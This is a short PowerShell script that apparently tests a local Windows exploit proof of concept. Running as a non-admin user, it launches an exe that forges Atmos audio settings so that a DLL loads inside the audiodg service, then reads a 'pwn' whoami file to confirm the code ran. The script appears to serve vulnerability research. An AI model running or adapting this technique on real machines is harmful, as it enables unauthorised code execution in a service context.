# Proactive test for spatial_audio_zeroadmin_poc_v3.exe (run as NON-ADMIN doggy2, no admin needed).
#   powershell -ExecutionPolicy Bypass -File C:\squat_test\release_v3_ZeroAdmin_SYSTEM\run_busy_test.ps1
# The exe is fully self-contained: it plays an embedded looping tone to keep audiodg LIVE itself,
# forges the Atmos SEL/CAP, forces the endpoint graph to rebuild (IPolicyConfig default flip, no
# wait-for-idle), then triggers the spatial codec load inside audiodg (LOCAL SERVICE).
$ErrorActionPreference = 'Continue'
$rel = 'C:\squat_test\release_v3_ZeroAdmin_SYSTEM'

# clear any prior install so the exe registers the fresh (DGAF-hardened) package
Get-AppxPackage CodecHostPoc -EA SilentlyContinue | Remove-AppxPackage -EA SilentlyContinue

Write-Host "================ RUN (self-contained, proactive, no idle-wait) ================"
& "$rel\spatial_audio_zeroadmin_poc_v3.exe"
Write-Host "================ EXIT=$LASTEXITCODE ================"

if (Test-Path 'C:\Users\Public\audiodg_pwn_whoami.txt') {
    Write-Host "---- C:\Users\Public\audiodg_pwn_whoami.txt (written by proof.dll inside audiodg) ----"
    Get-Content 'C:\Users\Public\audiodg_pwn_whoami.txt'
}
